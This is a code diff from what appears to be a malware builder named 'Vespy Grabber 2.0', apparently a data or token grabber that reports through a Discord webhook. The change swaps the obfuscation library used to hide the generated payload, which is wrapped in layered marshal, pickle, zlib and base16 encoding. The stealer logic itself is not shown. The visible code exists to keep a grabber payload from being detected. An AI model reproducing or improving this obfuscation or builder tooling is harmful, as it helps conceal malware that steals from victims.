@@ -8,7 +8,7 @@ from threading import Thread
 from tkinter import messagebox
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from tkinter.filedialog import askopenfilename
-from Whatfuscator import init, firstwall
+from WhatObf import init, whatobfuscate
 
 window = Tk()
 window.title("Vespy Grabber 2.0 || @i_might_be_vesper")
@@ -175,7 +175,7 @@ main()
     def _Obfuscation(self, name):
         # Shit obfuscation, will make it better next update
         CONTENT = open(f"{name}.py","r").read()
-        CONTENT = firstwall(CONTENT)
+        CONTENT = whatobfuscate(CONTENT)
         for _ in range(2):
             POOP = base64.b16encode(zlib.compress(pickle.dumps(marshal.dumps(compile(CONTENT.encode(),f"WHAT????","exec"))))).decode()
             CONTENT = f"""{open("utils/Imports.py","r").read()}\n__Obf__="Simple Obf"
